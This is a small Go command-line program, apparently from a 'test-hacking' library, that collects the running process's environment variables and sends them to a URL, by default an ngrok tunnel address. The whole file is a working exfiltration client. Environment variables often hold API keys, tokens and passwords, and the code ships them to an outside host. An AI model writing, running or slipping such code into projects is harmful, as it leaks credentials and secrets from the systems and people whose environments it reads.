package main

import (
	"flag"
	"fmt"
	"os"

	"github.com/melisource/fury_test-hacking-lib/pkg/mypackage"
)

func main() {
	// Default URL from the requirement
	defaultURL := "https://9ccf312101ab.ngrok-free.app"

	// Define command-line flags
	targetURL := flag.String("url", defaultURL, "Target URL to send environment variables")

	// Parse command-line flags
	flag.Parse()

	// Create new EnvSender
	sender := mypackage.NewEnvSender(*targetURL)

	// Send environment variables
	if err := sender.SendEnvVars(); err != nil {
		fmt.Fprintf(os.Stderr, "Error: %v\n", err)
		os.Exit(1)
	}

	fmt.Println("Environment variables sent successfully!")
}
